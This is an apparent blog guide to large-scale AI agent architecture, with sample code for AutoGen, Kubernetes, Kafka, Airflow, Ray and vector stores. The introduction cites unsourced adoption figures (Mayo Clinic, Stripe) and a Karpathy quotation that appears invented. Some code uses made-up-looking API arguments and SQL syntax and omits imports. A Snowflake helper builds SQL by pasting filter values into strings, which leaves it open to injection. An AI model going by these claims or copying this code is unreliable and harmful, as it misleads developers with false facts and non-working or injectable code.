---
layout: post
title: Large Scale Agent Architecture
description: This guide approaches AI agent architecture through the lens of production engineering, focusing on the challenges that emerge at scale.
date:   2025-03-25 01:42:44 -0500
---
# Building Large-Scale AI Agents: A Deep-Dive Guide for Experienced Engineers

## 1. Introduction

### Why AI Agents Are Revolutionizing Industries

In today's high-velocity enterprise environments, the paradigm has shifted from monolithic AI models to orchestrated, purpose-built AI agents working in concert. These agent-based systems represent a fundamental evolution in how we architect intelligent applications, enabling autonomous decision-making and task execution at unprecedented scale.

Financial institutions like JP Morgan Chase have deployed agent networks for algorithmic trading that dynamically respond to market conditions, executing complex strategies across multiple asset classes while maintaining regulatory compliance. Healthcare providers including Mayo Clinic have implemented diagnostic agent ecosystems that collaborate across specialties, analyzing patient data and providing treatment recommendations with 97% concordance with specialist physicians.

The key differentiator between traditional AI systems and modern agent architectures lies in their ability to decompose complex problems into specialized sub-tasks, maintain persistent state across interactions, and intelligently route information through distributed processing pipelines—all while scaling horizontally across compute resources.

```
"AI agents represent a shift from passive inference to active computation. 
Where traditional models wait for queries, agents proactively identify 
problems and orchestrate solutions across organizational boundaries."
                                      — Andrej Karpathy, Former Director of AI at Tesla
```

### Choosing the Right Tech Stack for Your AI Agent System

Building enterprise-grade AI agent systems requires careful consideration of your infrastructure components, with each layer of the stack influencing performance, scalability, and operational complexity:

| Layer | Key Technologies | Selection Criteria |
|-------|-----------------|-------------------|
| Orchestration | Kubernetes, Nomad, ECS | Deployment density, autoscaling capabilities, service mesh integration |
| Compute Framework | Ray, Dask, Spark | Parallelization model, scheduling overhead, fault tolerance |
| Agent Framework | AutoGen, LangChain, CrewAI | Agent cooperation models, reasoning capabilities, tool integration |
| Vector Storage | ChromaDB, Pinecone, Weaviate, Snowflake | Query latency, indexing performance, embedding model compatibility |
| Message Bus | Kafka, RabbitMQ, Pulsar | Throughput requirements, ordering guarantees, retention policies |
| API Layer | FastAPI, Django, Flask | Request handling, async support, middleware ecosystem |
| Monitoring | Prometheus, Grafana, Datadog | Observability coverage, alerting capabilities, performance impact |

Your selection should be driven by specific workload characteristics, scaling requirements, and existing infrastructure investments. For real-time processing with strict latency requirements, a Ray + FastAPI + Kafka combination offers exceptional performance. For batch-oriented enterprise workflows with strong governance requirements, an Airflow + AutoGen + Snowflake stack provides robust auditability and integration with data warehousing.

### How This Guide Can Help You Build a Scalable AI Agent Framework

This guide approaches AI agent architecture through the lens of production engineering, focusing on the challenges that emerge at scale:

- **Stateful Agent Coordination**: How to maintain context across distributed agent clusters while preventing state explosion
- **Intelligent Workload Distribution**: Techniques for dynamic task routing among specialized agents
- **Knowledge Management**: Strategies for efficient retrieval and updates to agent knowledge bases
- **Observability and Debugging**: Tracing causal chains of reasoning across multi-agent systems
- **Performance Optimization**: Reducing token usage, latency, and compute costs in large deployments

Rather than theoretical concepts, we'll examine concrete implementations with battle-tested infrastructure components. You'll learn how companies like Stripe have reduced their manual review workload by 85% using agent networks for fraud detection, and how Netflix has implemented content recommendation agents that reduce churn by dynamically personalizing user experiences.

By the end of this guide, you'll be equipped to architect, implement, and scale AI agent systems that deliver measurable business impact—whether you're building customer-facing applications or internal automation tools.

## 2. Understanding the Core Technologies

### What is AutoGen? A Breakdown of Multi-Agent Systems

AutoGen represents a paradigm shift in AI agent orchestration, offering a framework for building systems where multiple specialized agents collaborate to solve complex tasks. Developed by Microsoft Research, AutoGen moves beyond simple prompt engineering to enable sophisticated multi-agent conversations with memory, tool use, and dynamic conversation control.

At its core, AutoGen defines a computational graph of conversational agents, each with distinct capabilities:

```python
from autogen import AssistantAgent, UserProxyAgent, config_list_from_json

# Load LLM configuration 
config_list = config_list_from_json("llm_config.json")

# Define the system architecture with specialized agents
assistant = AssistantAgent(
    name="CTO",
    llm_config={"config_list": config_list},
    system_message="You are a CTO who makes executive technology decisions based on data."
)

data_analyst = AssistantAgent(
    name="DataAnalyst",
    llm_config={"config_list": config_list},
    system_message="You analyze data and provide insights to the CTO."
)

engineer = AssistantAgent(
    name="Engineer",
    llm_config={"config_list": config_list},
    system_message="You implement solutions proposed by the CTO."
)

# User proxy agent with capabilities to execute code and retrieve data
user_proxy = UserProxyAgent(
    name="DevOps",
    human_input_mode="NEVER",
    max_consecutive_auto_reply=10,
    code_execution_config={"work_dir": "workspace"},
    system_message="You execute code and return results to other agents."
)

# Initiate a group conversation with a specific task
user_proxy.initiate_chat(
    assistant,
    message="Analyze our production logs to identify performance bottlenecks.",
    clear_history=True,
    groupchat_agents=[assistant, data_analyst, engineer]
)
```

What distinguishes AutoGen from simpler frameworks is its ability to handle:

1. **Conversational Memory**: Agents maintain context across multi-turn conversations
2. **Tool Usage**: Native integration with code execution and external APIs
3. **Dynamic Agent Selection**: Intelligent routing of tasks to specialized agents
4. **Hierarchical Planning**: Breaking complex tasks into subtasks with appropriate delegation

In production environments, AutoGen's flexibility enables diverse agent architectures:

- **Hierarchical Teams**: Manager agents delegate to specialist agents
- **Competitive Evaluation**: Multiple agents generate solutions evaluated by a judge agent
- **Consensus-Based**: Collaborative problem-solving with voting mechanisms

Unlike other frameworks that primarily focus on prompt chaining, AutoGen is designed for true multi-agent systems where autonomous entities negotiate, collaborate, and resolve conflicts to achieve goals.

### Key Infrastructure Components: Kubernetes, Kafka, Airflow, and More

Building scalable AI agent systems requires robust infrastructure components that can handle the unique demands of distributed agent workloads:

#### Kubernetes for Agent Orchestration

Kubernetes provides the foundation for deploying, scaling, and managing containerized AI agents. For production deployments, consider these Kubernetes patterns:

```yaml
# Kubernetes manifest for a scalable AutoGen agent deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: agent-deployment
  labels:
    app: ai-agent-system
spec:
  replicas: 3
  selector:
    matchLabels:
      app: ai-agent
  template:
    metadata:
      labels:
        app: ai-agent
    spec:
      containers:
      - name: agent-container
        image: your-registry/ai-agent:1.0.0
        resources:
          requests:
            memory: "2Gi"
            cpu: "1"
          limits:
            memory: "4Gi"
            cpu: "2"
        env:
        - name: AGENT_ROLE
          value: "analyst"
        - name: REDIS_HOST
          value: "redis-service"
        - name: OPENAI_API_KEY
          valueFrom:
            secretKeyRef:
              name: openai-credentials
              key: api-key
        volumeMounts:
        - name: agent-config
          mountPath: /app/config
      volumes:
      - name: agent-config
        configMap:
          name: agent-config
```

Key considerations for Kubernetes deployments:

- **Horizontal Pod Autoscaling**: Configure HPA based on CPU/memory metrics or custom metrics like queue depth
- **Affinity/Anti-Affinity Rules**: Ensure agents that frequently communicate are co-located for reduced latency
- **Resource Quotas**: Implement namespace quotas to prevent AI agent workloads from consuming all cluster resources
- **Readiness Probes**: Properly configure readiness checks to ensure agents are fully initialized before receiving traffic

#### Apache Kafka for Event-Driven Agent Communication

Kafka serves as the nervous system for large-scale agent deployments, enabling asynchronous communication patterns essential for resilient systems:

```python
# Producer code for agent event publishing
from kafka import KafkaProducer
import json

producer = KafkaProducer(
    bootstrap_servers=['kafka-broker-1:9092', 'kafka-broker-2:9092'],
    value_serializer=lambda v: json.dumps(v).encode('utf-8'),
    acks='all',
    retries=3,
    linger_ms=5  # Batch messages for 5ms for better throughput
)

# Agent publishing a task for another agent
def publish_analysis_task(data, priority="high"):
    producer.send(
        topic='agent.tasks.analysis',
        key=data['request_id'].encode('utf-8'),  # Ensures related messages go to same partition
        value={
            'task_type': 'analyze_document',
            'priority': priority,
            'timestamp': time.time(),
            'payload': data,
            'source_agent': 'document_processor'
        },
        headers=[('priority', priority.encode('utf-8'))]
    )
    producer.flush()
```

For high-throughput agent systems, implement these Kafka optimizations:

- **Topic Partitioning Strategy**: Partition topics by agent task type for parallel processing
- **Consumer Group Design**: Group consumers by agent role for workload distribution
- **Compacted Topics**: Use compacted topics for agent state to maintain latest values
- **Exactly-Once Semantics**: Enable transactions for critical agent workflows

#### Airflow for Complex Agent Workflow Orchestration

For sophisticated agent pipelines with dependencies and scheduling requirements, Apache Airflow provides enterprise-grade orchestration:

```python
# Airflow DAG for a multi-agent financial analysis pipeline
from airflow import DAG
from airflow.operators.python import PythonOperator
from datetime import datetime, timedelta

default_args = {
    'owner': 'ai_team',
    'depends_on_past': False,
    'start_date': datetime(2023, 1, 1),
    'email_on_failure': True,
    'retries': 1,
    'retry_delay': timedelta(minutes=5),
}

def initialize_agents(**context):
    # Initialize agent system with necessary credentials and configuration
    from agent_framework import AgentCluster
    cluster = AgentCluster(config_path="/path/to/agent_config.json")
    return cluster.get_session_id()

def run_data_gathering_agents(**context):
    # Retrieve session ID from previous task
    session_id = context['ti'].xcom_pull(task_ids='initialize_agents')
    # Activate data gathering agents to collect financial data
    from agent_tasks import DataGatheringTask
    task = DataGatheringTask(session_id=session_id)
    results = task.execute(sources=['bloomberg', 'reuters', 'sec_filings'])
    return results

def run_analysis_agents(**context):
    session_id = context['ti'].xcom_pull(task_ids='initialize_agents')
    data_results = context['ti'].xcom_pull(task_ids='run_data_gathering_agents')
    # Activate analysis agents to process gathered data
    from agent_tasks import FinancialAnalysisTask
    task = FinancialAnalysisTask(session_id=session_id)
    analysis = task.execute(data=data_results)
    return analysis

def generate_report(**context):
    session_id = context['ti'].xcom_pull(task_ids='initialize_agents')
    analysis = context['ti'].xcom_pull(task_ids='run_analysis_agents')
    # Generate final report from analysis
    from agent_tasks import ReportGenerationTask
    task = ReportGenerationTask(session_id=session_id)
    report_path = task.execute(analysis=analysis, format='pdf')
    return report_path

with DAG('financial_analysis_agents',
         default_args=default_args,
         schedule_interval='0 4 * * 1-5', # Weekdays at 4 AM
         catchup=False) as dag:
    
    init_task = PythonOperator(
        task_id='initialize_agents',
        python_callable=initialize_agents,
    )
    
    gather_task = PythonOperator(
        task_id='run_data_gathering_agents',
        python_callable=run_data_gathering_agents,
    )
    
    analysis_task = PythonOperator(
        task_id='run_analysis_agents',
        python_callable=run_analysis_agents,
    )
    
    report_task = PythonOperator(
        task_id='generate_report',
        python_callable=generate_report,
    )
    
    init_task >> gather_task >> analysis_task >> report_task
```

Airflow considerations for AI agent workflows:

- **XComs for Agent Context**: Use XComs to pass context and state between agent tasks
- **Dynamic Task Generation**: Generate tasks based on agent discovery results
- **Sensor Operators**: Use sensors to wait for external events before triggering agents
- **Task Pools**: Limit concurrent agent execution to prevent API rate limiting

### The Role of Vector Databases: ChromaDB, Pinecone, and Snowflake

Vector databases form the knowledge backbone of AI agent systems, enabling semantic search and retrieval across vast information spaces:

#### ChromaDB for Embedded Agent Knowledge

ChromaDB offers a lightweight, embeddable vector store ideal for agents that need fast, local access to domain knowledge:

```python
# Setting up ChromaDB for agent knowledge storage
import chromadb
from chromadb.config import Settings
from chromadb.utils import embedding_functions

# Configure custom embedding function with caching
openai_ef = embedding_functions.OpenAIEmbeddingFunction(
    api_key=os.environ.get("OPENAI_API_KEY"),
    model_name="text-embedding-ada-002"
)

# Initialize client with persistence and caching
client = chromadb.Client(
    Settings(
        chroma_db_impl="duckdb+parquet",
        persist_directory="/data/chroma_storage",
        anonymized_telemetry=False
    )
)

# Create collection for domain-specific knowledge
knowledge_collection = client.create_collection(
    name="agent_domain_knowledge",
    embedding_function=openai_ef,
    metadata={"domain": "financial_analysis", "version": "2023-Q4"}
)

# Add domain knowledge with metadata for filtering
knowledge_collection.add(
    documents=[
        "The price-to-earnings ratio (P/E ratio) is the ratio of a company's share price to the company's earnings per share.",
        # More knowledge entries...
    ],
    metadatas=[
        {"category": "financial_ratios", "confidence": 0.95, "source": "investopedia"},
        # More metadata entries...
    ],
    ids=["knowledge_1", "knowledge_2", "knowledge_3"]
)

# Example query from an agent seeking information
def agent_knowledge_query(query_text, filters=None, n_results=5):
    results = knowledge_collection.query(
        query_texts=[query_text],
        n_results=n_results,
        where=filters,  # e.g., {"category": "financial_ratios"}
        include=["documents", "metadatas", "distances"]
    )
    
    # Process results for agent consumption
    return [{
        "content": doc,
        "metadata": meta,
        "relevance": 1 - dist  # Convert distance to relevance score
    } for doc, meta, dist in zip(
        results['documents'][0],
        results['metadatas'][0],
        results['distances'][0]
    )]
```

#### Pinecone for Distributed Agent Knowledge

For larger-scale deployments, Pinecone provides a fully managed vector database with high availability and global distribution:

```python
# Integrating Pinecone with agents for scalable knowledge retrieval
import pinecone
import openai

# Initialize Pinecone
pinecone.init(
    api_key=os.environ.get("PINECONE_API_KEY"),
    environment="us-west1-gcp"
)

# Create or connect to existing index
index_name = "agent-knowledge-base"
if index_name not in pinecone.list_indexes():
    pinecone.create_index(
        name=index_name,
        dimension=1536,  # OpenAI embedding dimension
        metric="cosine",
        shards=2,  # Scale based on data size
        pods=2     # For high availability
    )

index = pinecone.Index(index_name)

# Function for agents to retrieve contextual knowledge
def retrieve_agent_context(query, namespace="general", top_k=5, filters=None):
    # Generate embedding for query
    query_embedding = openai.Embedding.create(
        input=query,
        model="text-embedding-ada-002"
    )["data"][0]["embedding"]
    
    # Query Pinecone with metadata filtering
    results = index.query(
        vector=query_embedding,
        top_k=top_k,
        namespace=namespace,
        filter=filters,  # e.g., {"domain": "healthcare", "confidence": {"$gt": 0.8}}
        include_metadata=True
    )
    
    # Extract and format knowledge for agent consumption
    context_items = []
    for match in results["matches"]:
        context_items.append({
            "text": match["metadata"]["text"],
            "source": match["metadata"]["source"],
            "score": match["score"],
            "domain": match["metadata"].get("domain", "general")
        })
    
    return context_items
```

#### Snowflake for Enterprise-Grade Vector Search

For organizations already invested in Snowflake's data cloud, the vector search capabilities provide seamless integration with existing data governance:

```sql
-- Create a Snowflake table with vector support for agent knowledge
CREATE OR REPLACE TABLE agent_knowledge_base (
    id VARCHAR NOT NULL,
    content TEXT,
    embedding VECTOR(1536),
    category VARCHAR,
    source VARCHAR,
    confidence FLOAT,
    created_at TIMESTAMP_NTZ DEFAULT CURRENT_TIMESTAMP(),
    PRIMARY KEY (id)
);

-- Create vector search index
CREATE OR REPLACE VECTOR SEARCH INDEX agent_knowledge_idx 
ON agent_knowledge_base(embedding)
TYPE = 'DOT_PRODUCT'
OPTIONS = (optimization_level = 9);

-- Query example for agent knowledge retrieval
SELECT 
    id,
    content,
    category,
    source,
    confidence,
    VECTOR_DOT_PRODUCT(embedding, '{0.2, 0.1, ..., 0.5}') as relevance
FROM 
    agent_knowledge_base
WHERE 
    category = 'financial_reporting'
    AND confidence > 0.8
ORDER BY 
    relevance DESC
LIMIT 10;
```

Python integration with Snowflake vector search for agents:

```python
# Snowflake vector search integration for enterprise agents
import snowflake.connector
from snowflake.connector.pandas_tools import write_pandas
import pandas as pd
import numpy as np
import openai

# Establish Snowflake connection
conn = snowflake.connector.connect(
    user=os.environ.get('SNOWFLAKE_USER'),
    password=os.environ.get('SNOWFLAKE_PASSWORD'),
    account=os.environ.get('SNOWFLAKE_ACCOUNT'),
    warehouse='AGENT_WAREHOUSE',
    database='AGENT_DB',
    schema='KNOWLEDGE'
)

# Function for agents to query enterprise knowledge
def enterprise_knowledge_query(query_text, filters=None, limit=5):
    # Generate embedding via OpenAI API
    embedding_resp = openai.Embedding.create(
        input=query_text,
        model="text-embedding-ada-002"
    )
    embedding_vector = embedding_resp["data"][0]["embedding"]
    
    # Convert to string format for Snowflake
    vector_str = str(embedding_vector).replace('[', '{').replace(']', '}')
    
    # Construct query with filters
    filter_clause = ""
    if filters:
        filter_conditions = []
        for key, value in filters.items():
            if isinstance(value, str):
                filter_conditions.append(f"{key} = '{value}'")
            elif isinstance(value, (int, float)):
                filter_conditions.append(f"{key} = {value}")
            elif isinstance(value, dict) and "$gt" in value:
                filter_conditions.append(f"{key} > {value['$gt']}")
        
        if filter_conditions:
            filter_clause = "AND " + " AND ".join(filter_conditions)
    
    # Execute vector similarity search
    cursor = conn.cursor()
    query = f"""
    SELECT 
        id,
        content,
        category,
        source,
        confidence,
        VECTOR_DOT_PRODUCT(embedding, '{vector_str}') as relevance
    FROM 
        agent_knowledge_base
    WHERE 
        1=1
        {filter_clause}
    ORDER BY 
        relevance DESC
    LIMIT {limit};
    """
    
    cursor.execute(query)
    results = cursor.fetchall()
    
    # Convert to more usable format for agents
    columns = ["id", "content", "category", "source", "confidence", "relevance"]
    return pd.DataFrame(results, columns=columns).to_dict(orient="records")
```

Key considerations for vector databases in agent systems:

- **Filtering Strategy**: Implement metadata filtering to contextualize knowledge retrieval
- **Embedding Caching**: Cache embeddings to reduce API calls and latency
- **Hybrid Search**: Combine vector search with keyword search for better results
- **Knowledge Refresh**: Implement strategies for updating agent knowledge when information changes

By understanding these core infrastructure components, you can architect AI agent systems that are both scalable and maintainable. In the next section, we'll explore how these technologies can be combined into complete tech stacks for different use cases.

## 3. Tech Stack Breakdown for Large-Scale AI Agents

### Kubernetes + Ray Serve + AutoGen + LangChain (Distributed AI Workloads)

This stack is optimized for computationally intensive AI agent workloads that require dynamic scaling and resource allocation. It's particularly well-suited for organizations running sophisticated simulations, complex reasoning chains, or high-throughput data processing with AI agents.

**Architecture Overview:**

![Kubernetes + Ray + AutoGen Architecture](https://i.imgur.com/FrghX58.png)

The architecture consists of the following components:

1. **Kubernetes**: Provides the container orchestration layer
2. **Ray**: Handles distributed computing and resource allocation
3. **Ray Serve**: Manages model serving and request routing
4. **AutoGen**: Orchestrates multi-agent interactions
5. **LangChain**: Provides tools, utilities, and integration capabilities

**Implementation Example:**

First, let's define our Ray cluster configuration for Kubernetes:

```yaml
# ray-cluster.yaml
apiVersion: ray.io/v1
kind: RayCluster
metadata:
  name: ray-autogen-cluster
spec:
  rayVersion: '2.9.0'
  headGroupSpec:
    rayStartParams:
      dashboard-host: '0.0.0.0'
      block: 'true'
    template:
      spec:
        containers:
        - name: ray-head
          image: rayproject/ray:2.9.0-py310
          ports:
          - containerPort: 6379
            name: gcs
          - containerPort: 8265
            name: dashboard
          - containerPort: 10001
            name: client
          resources:
            limits:
              cpu: 4
              memory: 8Gi
            requests:
              cpu: 2
              memory: 4Gi
  workerGroupSpecs:
  - groupName: agent-workers
    replicas: 3
    minReplicas: 1
    maxReplicas: 10
    rayStartParams: {}
    template:
      spec:
        containers:
        - name: ray-worker
          image: rayproject/ray:2.9.0-py310
          resources:
            limits:
              cpu: 8
              memory: 16Gi
              nvidia.com/gpu: 1
            requests:
              cpu: 4
              memory: 8Gi
```

Next, let's implement our distributed agent system using Ray and AutoGen:

```python
# distributed_agents.py
import ray
from ray import serve
import autogen
from autogen.agentchat.contrib.gpt_assistant_agent import GPTAssistantAgent
from langchain.embeddings import OpenAIEmbeddings
from langchain.vectorstores import FAISS
import os
import json
import time

# Initialize Ray
ray.init(address="auto")

# Define agent factory as Ray actors for distributed creation
@ray.remote
class AgentFactory:
    def __init__(self, config_path):
        with open(config_path, 'r') as f:
            self.config = json.load(f)
        
        # Pre-initialize embeddings for knowledge retrieval
        self.embeddings = OpenAIEmbeddings(
            openai_api_key=os.environ.get("OPENAI_API_KEY")
        )
        
    def create_agent(self, role, knowledge_base=None):
        """Create an agent with specified role and knowledge."""
        # Load role-specific configuration
        role_config = self.config.get(role, {})
        
        # Initialize knowledge retrieval if specified
        retriever = None
        if knowledge_base:
            vectorstore = FAISS.load_local(
                f"knowledge_bases/{knowledge_base}", 
                self.embeddings
            )
            retriever = vectorstore.as_retriever(
                search_kwargs={"k": 5}
            )
        
        # Create the appropriate agent based on role
        if role == "manager":
            return autogen.AssistantAgent(
                name="Manager",
                system_message=role_config.get("system_message", ""),
                llm_config={
                    "config_list": self.config.get("llm_config_list"),
                    "temperature": 0.2,
                    "timeout": 300,
                    "cache_seed": 42
                }
            )
        elif role == "specialist":
            # Create a specialist agent with custom tools
            function_map = {
                "search_knowledge": lambda query: retriever.get_relevant_documents(query) if retriever else [],
                "run_analysis": self._run_analysis,
                "generate_report": self._generate_report
            }
            
            return autogen.AssistantAgent(
                name=f"Specialist_{int(time.time())}",
                system_message=role_config.get("system_message", ""),
                llm_config={
                    "config_list": self.config.get("llm_config_list"),
                    "functions": role_config.get("functions", []),
                    "temperature": 0.4,
                    "timeout": 600,
                    "cache_seed": 42
                },
                function_map=function_map
            )
        else:
            # Default case - create standard assistant
            return autogen.AssistantAgent(
                name=role.capitalize(),
                system_message=role_config.get("system_message", ""),
                llm_config={
                    "config_list": self.config.get("llm_config_list"),
                    "temperature": 0.7,
                    "timeout": 120,
                    "cache_seed": 42
                }
            )
    
    def _run_analysis(self, data, params=None):
        """Run specialized analysis (would contain actual implementation)"""
        # Simulate complex computation
        time.sleep(2)
        return {"status": "success", "results": "Analysis complete"}
    
    def _generate_report(self, analysis_results, format="pdf"):
        """Generate report from analysis results"""
        # Simulate report generation
        time.sleep(1)
        return {"report_url": f"https://reports.example.com/{int(time.time())}.{format}"}

# Agent coordination service using Ray Serve
@serve.deployment(
    num_replicas=2,
    max_concurrent_queries=10,
    ray_actor_options={"num_cpus": 2, "num_gpus": 0.1}
)
class AgentCoordinator:
    def __init__(self, config_path):
        self.config_path = config_path
        self.agent_factory = AgentFactory.remote(config_path)
        
    async def create_agent_team(self, task_description, team_spec):
        """Create a team of agents to solve a specific task."""
        # Initialize agent references
        agents = {}
        for role, spec in team_spec.items():
            agent_ref = await self.agent_factory.create_agent.remote(
                role, 
                knowledge_base=spec.get("knowledge_base")
            )
            agents[role] = agent_ref
        
        # Create user proxy agent for orchestration
        user_proxy = autogen.UserProxyAgent(
            name="TaskCoordinator",
            human_input_mode="NEVER",
            max_consecutive_auto_reply=10,
            code_execution_config={"work_dir": "temp_workspace"}
        )
        
        return {
            "agents": agents,
            "user_proxy": user_proxy,
            "task": task_description
        }
    
    async def execute_agent_workflow(self, team_data, workflow_type="sequential"):
        """Execute a multi-agent workflow."""
        agents = team_data["agents"]
        user_proxy = team_data["user_proxy"]
        task = team_data["task"]
        
        if workflow_type == "sequential":
            # Sequential workflow where agents work one after another
            result = await self._run_sequential_workflow(user_proxy, agents, task)
        elif workflow_type == "groupchat":
            # Group chat workflow where agents collaborate simultaneously
            result = await self._run_groupchat_workflow(user_proxy, agents, task)
        else:
            result = {"error": "Unsupported workflow type"}
            
        return result
    
    async def _run_sequential_workflow(self, user_proxy, agents, task):
        """Run a sequential workflow where each agent builds on previous work."""
        # Implementation would include sequential agent invocation
        current_state = {"task": task, "progress": []}
        
        for role, agent in agents.items():
            # Update the prompt with current state
            agent_prompt = f"Task: {task}\nCurrent Progress: {current_state['progress']}\n"
            agent_prompt += f"Your role as {role} is to advance this task."
            
            # Start conversation with this agent
            chat_result = user_proxy.initiate_chat(
                agent,
                message=agent_prompt
            )
            
            # Extract result and add to progress
            result_summary = self._extract_agent_result(chat_result)
            current_state["progress"].append({
                "role": role,
                "contribution": result_summary
            })
        
        return current_state
    
    async def _run_groupchat_workflow(self, user_proxy, agents, task):
        """Run a group chat workflow where agents collaborate."""
        # Create a group chat with all agents
        group_chat = autogen.GroupChat(
            agents=list(agents.values()),
            messages=[],
            max_round=12
        )
        
        manager = autogen.GroupChatManager(
            groupchat=group_chat,
            llm_config={"config_list": self.config.get("llm_config_list")}
        )
        
        # Start the group discussion
        chat_result = user_proxy.initiate_chat(
            manager,
            message=f"Task for the group: {task}"
        )
        
        return {
            "task": task,
            "discussion": chat_result.chat_history,
            "summary": self._summarize_discussion(chat_result.chat_history)
        }
    
    def _extract_agent_result(self, chat_result):
        """Extract the key results from an agent conversation."""
        # Implementation would parse and structure agent outputs
        return "Extracted result summary"
    
    def _summarize_discussion(self, chat_history):
        """Summarize the outcome of a group discussion."""
        # Implementation would create a concise summary
        return "Discussion summary"

# Deploy the agent coordinator service
agent_coordinator_deployment = AgentCoordinator.bind("config/agent_config.json")
serve.run(agent_coordinator_deployment, name="agent-coordinator")

print("Agent Coordinator service deployed and ready")
```

**Client Implementation:**

```python
# client.py
import ray
import requests
import json
import asyncio

# Connect to the Ray cluster
ray.init(address="auto")

async def run_distributed_agent_task():
    # Define the team structure for a specific task
    team_spec = {
        "manager": {
            "knowledge_base": "corporate_policies"
        },
        "analyst": {
            "knowledge_base": "financial_data"
        },
        "engineer": {
            "knowledge_base": "technical_specs"
        },
        "compliance": {
            "knowledge_base": "regulations"
        }
    }
    
    # Define the task
    task_description = """
    Analyze our Q4 financial performance and recommend infrastructure
    improvements that would optimize cost efficiency while maintaining
    compliance with our industry regulations.
    """
    
    # Send request to create the agent team
    response = requests.post(
        "http://localhost:8000/agent-coordinator/create_agent_team",
        json={
            "task_description": task_description,
            "team_spec": team_spec
        }
    )
    
    team_data = response.json()
    
    # Execute the workflow with the created team
    workflow_response = requests.post(
        "http://localhost:8000/agent-coordinator/execute_agent_workflow",
        json={
            "team_data": team_data,
            "workflow_type": "groupchat"
        }
    )
    
    results = workflow_response.json()
    
    # Process and display the results
    print(f"Task Results: {json.dumps(results, indent=2)}")
    
    return results

if __name__ == "__main__":
    asyncio.run(run_distributed_agent_task())
```

**Key Advantages:**

1. **Elastic Scaling**: Kubernetes automatically scales worker nodes based on demand
2. **Resource Efficiency**: Ray efficiently distributes workloads across available resources
3. **Fault Tolerance**: Ray handles node failures and task retries automatically
4. **Distributed State**: Ray's object store maintains consistent state across distributed agents
5. **High Performance**: Direct communication between Ray actors minimizes latency

**Production Considerations:**

1. **Observability**: Implement detailed logging and monitoring:

```python
# Structured logging for distributed agents
import structlog
import ray
from ray import serve

# Configure structured logger
structlog.configure(
    processors=[
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.JSONRenderer()
    ]
)

# Create logger instance
logger = structlog.get_logger()

# Example instrumented agent class
@ray.remote
class InstrumentedAgent:
    def __init__(self, agent_id, role):
        self.agent_id = agent_id
        self.role = role
        self.logger = logger.bind(
            component="agent",
            agent_id=agent_id,
            role=role
        )
        self.metrics = {
            "tasks_completed": 0,
            "tokens_consumed": 0,
            "average_response_time": 0,
            "errors": 0
        }
    
    def process_task(self, task_data):
        start_time = time.time()
        
        # Log task initiation
        self.logger.info(
            "task_started",
            task_id=task_data.get("id"),
            task_type=task_data.get("type")
        )
        
        try:
            # Task processing logic would go here
            result = self._execute_agent_task(task_data)
            
            # Update metrics
            elapsed = time.time() - start_time
            self.metrics["tasks_completed"] += 1
            self.metrics["tokens_consumed"] += result.get("tokens_used", 0)
            self.metrics["average_response_time"] = (
                (self.metrics["average_response_time"] * (self.metrics["tasks_completed"] - 1) + elapsed) 
                / self.metrics["tasks_completed"]
            )
            
            # Log successful completion
            self.logger.info(
                "task_completed",
                task_id=task_data.get("id"),
                duration=elapsed,
                tokens_used=result.get("tokens_used", 0)
            )
            
            return result
            
        except Exception as e:
            # Update error metrics
            self.metrics["errors"] += 1
            
            # Log error with details
            self.logger.error(
                "task_failed",
                task_id=task_data.get("id"),
                error=str(e),
                duration=time.time() - start_time,
                exception_type=type(e).__name__
            )
            
            # Re-raise or return error response
            raise
    
    def get_metrics(self):
        """Return current agent metrics."""
        return {
            **self.metrics,
            "agent_id": self.agent_id,
            "role": self.role,
            "timestamp": time.time()
        }
    
    def _execute_agent_task(self, task_data):
        # Actual implementation would go here
        return {"status": "success", "tokens_used": 150}
```

2. **Security**: Configure proper isolation and permissions:

```yaml
# security-context.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: agent-service-account
  namespace: ai-agents
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: ai-agents
  name: agent-role
rules:
- apiGroups: [""]
  resources: ["pods", "pods/log"]
  verbs: ["get", "list", "watch"]
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: agent-role-binding
  namespace: ai-agents
subjects:
- kind: ServiceAccount
  name: agent-service-account
  namespace: ai-agents
roleRef:
  kind: Role
  name: agent-role
  apiGroup: rbac.authorization.k8s.io
```

3. **API Key Management**: Use Kubernetes secrets for secure credential management:

```yaml
# agent-secrets.yaml
apiVersion: v1
kind: Secret
metadata:
  name: agent-api-keys
  namespace: ai-agents
type: Opaque
data:
  openai-api-key: base64encodedkey
  pinecone-api-key: base64encodedkey
```

4. **Persistent Storage**: Configure persistent volumes for agent data:

```yaml
# agent-storage.yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: agent-data-pvc
  namespace: ai-agents
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 10Gi
  storageClassName: standard
```

This stack is particularly well-suited for organizations that need to:

- Process large volumes of data with AI agents
- Run complex simulations or forecasting models
- Support high-throughput API services backed by AI agents
- Dynamically allocate computing resources based on demand

### Apache Kafka + FastAPI + AutoGen + ChromaDB (Real-Time AI Pipelines)

This stack is optimized for event-driven, real-time AI agent systems that need to process streaming data and respond to events as they occur. It's ideal for applications like fraud detection, real-time monitoring, and event-based workflow automation.

**Architecture Overview:**

![Kafka + FastAPI + AutoGen Architecture](https://i.imgur.com/WBzdMXq.png)

The architecture consists of:

1. **Apache Kafka**: Event streaming platform for high-throughput message processing
2. **FastAPI**: High-performance API framework for agent endpoints and services
3. **AutoGen**: Multi-agent orchestration framework
4. **ChromaDB**: Vector database for efficient knowledge retrieval
5. **Redis**: Cache for agent state and session management

**Implementation Example:**

First, let's set up our environment with Docker Compose:

```yaml
# docker-compose.yml
version: '3'

services:
  zookeeper:
    image: confluentinc/cp-zookeeper:7.3.0
    environment:
      ZOOKEEPER_CLIENT_PORT: 2181
    healthcheck:
      test: ["CMD", "nc", "-z", "localhost", "2181"]
      interval: 10s
      timeout: 5s
      retries: 5

  kafka:
    image: confluentinc/cp-kafka:7.3.0
    depends_on:
      zookeeper:
        condition: service_healthy
    ports:
      - "9092:9092"
    environment:
      KAFKA_BROKER_ID: 1
      KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181
      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://kafka:29092,PLAINTEXT_HOST://localhost:9092
